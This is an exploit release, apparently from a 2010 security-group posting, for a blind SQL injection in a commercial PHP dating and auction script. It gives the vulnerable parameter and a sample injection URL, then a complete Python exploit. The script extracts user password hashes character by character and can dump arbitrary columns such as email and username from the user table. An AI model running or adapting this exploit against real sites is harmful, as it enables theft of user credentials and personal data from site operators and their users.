----------------------------Information------------------------------------------------
+Name : Date & Sex Vor und Rückwärts Auktions System <= v2 Blind SQL Injection Exploit
+Autor : Easy Laster
+Date   : 27.03.2010
+Script  : Date & Sex Vor und Rückwärts Auktions System <= v2
+Download : ------------------
+Demo : http://phpspezial.de/date-auktion-v2/
+Price : 599.99€
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr Chaos,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne.

---------------------------------------------------------------------------------------

 ___ ___ ___ ___                         _ _           _____           _         _
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|


----------------------------------------------------------------------------------------
+Vulnerability : http://www.site.com/flirt/auktion_text.php?id_auk=

#password
+Exploitable   : http://www.site.com/flirt/auktion_text.php?id_auk=1+and+1=1+and+
ascii(substring((SELECT password FROM fh_user+WHERE+iduser=1 LIMIT 0,1),1,1))>1


-----------------------------------------------------------------------------------------

#Exploit

#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys, urllib2, getopt

def out(str):
    sys.stdout.write(str)
    sys.stdout.flush()

def read_url(url):
    while True:
        try:
            src = urllib2.urlopen(url).read()
            break
        except:
            pass
    return src

class Exploit:
    charset = "0123456789abcdefABCDEF"
    url = ""
    charn = 1
    id = 1
    table_prefix = ""
    table_field = ""
    passwd = ""
    columns = []
    find_passwd = True

    def __init__(self):
        if len(sys.argv) < 2:
            print "*****************************************************************************"
            print "*Date&Sex Vor und Rückwärts Auktions System <=v2 Blind SQL Injection Exploit*"
            print "*****************************************************************************"
            print "*                Discovered and vulnerability by Easy Laster                *"
            print "*                             coded by Dr.ChAoS                             *"
            print "*****************************************************************************"
            print "* Usage:                                                                    *"
            print "* python exploit.py [OPTION...] [SWITCH...] <url>                           *"
            print "*                                                                           *"
            print "* Example:                                                                  *"
            print "*                                                                           *"
            print "* Get the password of the user with id 2:                                   *"
            print "* python exploit.py --id 2 http://site.de/path/                             *"
            print "*                                                                           *"
            print "* Get email, username and password of id 1:                                 *"
            print "* python exploit.py --columns 80:1:email,25:5:username http://site.de/      *"
            print "*                                                                           *"
            print "* Switches:                                                                 *"
            print "* --nopw                                  Search no password                *"
            print "*                                                                           *"
            print "* Options:                                                                  *"
            print "* --id <user id>                          User id                           *"
            print "* --prefix <table prefix>                 Table prefix of ECP               *"
            print "* --charn <1 - 32, default = 1>           Start at position x               *"
            print "* --columns <max_chars:charn:column,...>  Get value of any column you want  *"
            print "*****************************************************************************"
            exit()
        opts, switches = getopt.getopt(sys.argv[1:], "", ["id=", "prefix=", "charn=", "columns=", "nopw"])
        for opt in opts:
            if opt[0] == "--id":
                self.id = int(opt[1])
            elif opt[0] == "--prefix":
                self.table_prefix = opt[1]
            elif opt[0] == "--charn":
                self.charn = int(opt[1])
            elif opt[0] == "--columns":
                for col in opt[1].split(","):
                    max, charx, name = col.split(":")
                    self.columns.append([int(max), int(charx), name, ""])
            elif opt[0] == "--nopw":
                self.find_passwd = False
        for switch in switches:
            if switch[:4] == "http":
                if switch[-1:] == "/":
                    self.url = switch
                else:
                    self.url = switch + "/"
    def generate_url(self, ascii):
        return self.url + "auktion_text.php?id_auk=1+and+1=1+and+ascii(substring((SELECT%20" + self.table_field + "%20FROM%20" + self.table_prefix + "fh_user+WHERE+iduser=" + str(self.id) + "%20LIMIT%200,1)," + str(self.charn) + ",1))%3E" + str(ord(ascii))
    def start(self):
        print "Exploiting..."
        if self.find_passwd:
            charx = self.charn
            self.password()
        if len(self.columns) > 0:
            self.read_columns()
        print "All finished!\n"
        print "------ Results ------"
        if len(self.columns) > 0:
            for v in self.columns:
                print "Column \"" + v[2] + "\": " + v[3]
        if self.find_passwd:
            if len(self.passwd) == 32 - charx + 1:
                print "Password: " + self.passwd
            else:
                print "Password not found!"
        print "--------------------"
    def read_columns(self):
        end = False
        charrange = [0]
        charrange.extend(range(32, 256))
        for i in range(len(self.columns)):
            out("Getting value of \"" + self.columns[i][2] + "\": ")
            self.table_field = self.columns[i][2]
            self.charn = self.columns[i][1]
            for pwc in range(self.charn, self.columns[i][0] + 1):
                if end == True:
                    break
                self.charn = pwc
                end = False
                for c in charrange:
                    src = read_url(self.generate_url(chr(c)))
                    if "test" not in src:
                        if c == 0:
                            end = True
                        else:
                            self.columns[i][3] += chr(c)
                            out(chr(c))
                        break
            out("\n")
    def password(self):
        out("Getting password: ")
        self.table_field = "password"
        for pwc in range(self.charn, 33):
            self.charn = pwc
            for c in self.charset:
                src = read_url(self.generate_url(c))
                if "test" not in src:
                    self.passwd += c
                    out(c)
                    break
        out("\n")

exploit = Exploit()
exploit.start()